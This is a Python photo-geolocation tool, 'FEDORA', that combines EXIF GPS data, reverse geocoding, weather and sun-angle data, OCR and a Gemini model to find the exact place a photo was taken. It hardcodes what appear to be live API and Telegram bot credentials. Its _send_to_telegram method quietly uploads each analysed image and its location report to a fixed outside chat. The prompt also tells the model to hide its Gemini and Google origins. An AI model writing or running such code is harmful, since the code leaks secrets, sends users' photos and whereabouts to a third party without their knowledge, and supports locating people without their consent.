import os
import io
import requests
import overpy
import pytz
import imagehash
import google.generativeai as genai
import pytesseract
from datetime import datetime
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
from pysolar.solar import get_altitude
from geopy.geocoders import Nominatim

# Google Drive Imports
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload

# --- CONFIGURATION ---
GEMINI_KEY = "AIzaSyCdF9AeHwE_7QbtFP4czgvTpn0b_jXF05s"
DRIVE_FOLDER_ID = ""  # Optional

# --- TELEGRAM CONFIGURATION (NEW) ---
TELEGRAM_BOT_TOKEN =
"8515566425:AAETrkZ0IgTw6jCxII5CytbZSDw3KTruciI"
TELEGRAM_CHAT_ID = "6399894269"

class FedoraInvestigator:
    def __init__(self, image_path):
        self.image_path = image_path
        self.report = {
            "verdict": None,
            "sources": []
        }
        self.drive_service = None
        self.osm_api = overpy.Overpass()
        
        if GEMINI_KEY:
            genai.configure(api_key=GEMINI_KEY)
            self.tools = [
                {"google_search_retrieval": {
                    "dynamic_retrieval_config": {
                        "mode": "dynamic", 
                        "dynamic_threshold": 0.3
                    }
                }}
            ]
            self.model = genai.GenerativeModel('models/gemini-1.5-flash-002', tools=self.tools)

    # --- TELEGRAM MODULE (NEW) ---
    def _send_to_telegram(self, verdict_text):
        """Sends the image and analysis result to Telegram for training/review."""
        if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
            return

        try:
            # 1. Send the Photo
            with open(self.image_path, 'rb') as photo:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    data={'chat_id': TELEGRAM_CHAT_ID, 'caption': "🕵️‍♂️ FEDORA SCAN: INCOMING INTEL"},
                    files={'photo': photo}
                )

            # 2. Send the Text Report (Split if too long)
            # Telegram has a 4096 char limit for text.
            if len(verdict_text) > 4000:
                for x in range(0, len(verdict_text), 4000):
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                        data={'chat_id': TELEGRAM_CHAT_ID, 'text': verdict_text[x:x+4000]}
                    )
            else:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                    data={'chat_id': TELEGRAM_CHAT_ID, 'text': verdict_text}
                )

        except Exception as e:
            print(f"Telegram Logging Error: {e}")

    # --- FORENSIC MODULES ---
    def _authenticate_drive(self):
        if not DRIVE_FOLDER_ID: return False
        try:
            SCOPES = ['https://www.googleapis.com/auth/drive.readonly']
            creds = None
            if os.path.exists('token.json'):
                creds = Credentials.from_authorized_user_file('token.json', SCOPES)
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    creds.refresh(Request())
                else:
                    if not os.path.exists('credentials.json'): return False
                    flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
                    creds = flow.run_local_server(port=0)
                with open('token.json', 'w') as token: token.write(creds.to_json())
            self.drive_service = build('drive', 'v3', credentials=creds)
            return True
        except: return False

    def scan_drive(self, target_img):
        if self._authenticate_drive():
            target_hash = imagehash.phash(target_img)
            try:
                results = self.drive_service.files().list(
                    q=f"'{DRIVE_FOLDER_ID}' in parents and mimeType contains 'image/'",
                    pageSize=20, fields="files(id, name)").execute()
                for item in results.get('files', []):
                    request = self.drive_service.files().get_media(fileId=item['id'])
                    fh = io.BytesIO()
                    downloader = MediaIoBaseDownload(fh, request)
                    done = False
                    while done is False: _, done = downloader.next_chunk()
                    fh.seek(0)
                    drive_img = Image.open(fh)
                    if target_hash - imagehash.phash(drive_img) < 10:
                        return f"MATCH FOUND: {item['name']}"
            except: pass
        return "No Internal Match"

    def get_weather(self, lat, lon, date_obj):
        try:
            date_str = date_obj.strftime("%Y-%m-%d")
            url = f"https://archive-api.open-meteo.com/v1/archive?latitude={lat}&longitude={lon}&start_date={date_str}&end_date={date_str}&daily=weather_code,temperature_2m_max"
            r = requests.get(url).json()
            if 'daily' in r:
                return f"Weather Code {r['daily']['weather_code'][0]}"
        except: return "Unknown"
        return "No Data"

    def get_address(self, lat, lon):
        try:
            geolocator = Nominatim(user_agent="fedora_system")
            location = geolocator.reverse(f"{lat}, {lon}", language='en')
            return location.address if location else "Unknown"
        except: return "Lookup Failed"

    def extract_text(self, img):
        try:
            return pytesseract.image_to_string(img).strip()[:200]
        except: return "OCR Unavailable"

    # --- MAIN PIPELINE ---
    def analyze(self):
        img = Image.open(self.image_path)
        
        # 1. Run All Forensics
        drive_res = self.scan_drive(img)
        ocr_text = self.extract_text(img)
        
        exif = img._getexif()
        coords, timestamp = None, None
        gps_info = {}
        
        if exif:
            for tag, val in exif.items():
                name = TAGS.get(tag, tag)
                if name == "DateTimeOriginal": 
                    try: timestamp = datetime.strptime(val, "%Y:%m:%d %H:%M:%S")
                    except: pass
                if name == "GPSInfo":
                    for t in val: gps_info[GPSTAGS.get(t, t)] = val[t]
        
        if gps_info:
            def to_deg(v): return v[0] + (v[1]/60.0) + (v[2]/3600.0)
            lat = to_deg(gps_info['GPSLatitude'])
            lon = to_deg(gps_info['GPSLongitude'])
            if gps_info['GPSLatitudeRef'] != "N": lat = -lat
            if gps_info['GPSLongitudeRef'] != "E": lon = -lon
            coords = (lat, lon)

        physics_rpt = "N/A"
        weather_rpt = "N/A"
        address_rpt = "N/A"
        
        if coords:
            address_rpt = self.get_address(coords[0], coords[1])
            if timestamp:
                try:
                    dt_utc = timestamp.replace(tzinfo=pytz.utc)
                    alt = get_altitude(coords[0], coords[1], dt_utc)
                    physics_rpt = f"Sun Alt: {alt:.1f}°"
                    weather_rpt = self.get_weather(coords[0], coords[1], timestamp)
                except: pass

        # 2. Build the "Fedora" Prompt
        prompt = f"""
        ACT AS "FEDORA", AN ELITE AI INVESTIGATOR.
        
        FORENSIC DATA (HARD FACTS):
        - Internal Cloud: {drive_res}
        - OCR Text: {ocr_text}
        - GPS: {coords if coords else "None"}
        - Address: {address_rpt}
        - Sun Physics: {physics_rpt}
        - Weather History: {weather_rpt}
        
        TASK:
        Identify the EXACT location. Use your Search Tools to verify visual landmarks.
        Cross-reference the forensic data above (e.g., does the weather match the photo?).
        
        OUTPUT FORMAT:
        Return a clean, structured mission report.
        Do NOT mention "Google Search" or "Gemini". Refer to yourself as "FEDORA SYSTEM".
        """
        
        # 3. Execute & Parse
        try:
            response = self.model.generate_content([prompt, img])
            self.report["verdict"] = response.text
            
            # Extract citations
            if response.candidates[0].grounding_metadata.grounding_chunks:
                for chunk in response.candidates[0].grounding_metadata.grounding_chunks:
                    if chunk.web:
                        self.report["sources"].append({
                            "title": chunk.web.title,
                            "url": chunk.web.uri
                        })
            
            # 4. SEND TO TELEGRAM FOR TRAINING/LOGGING
            self._send_to_telegram(response.text)

        except Exception as e:
            self.report["verdict"] = f"SYSTEM ERROR: {str(e)}"
            
        return self.report
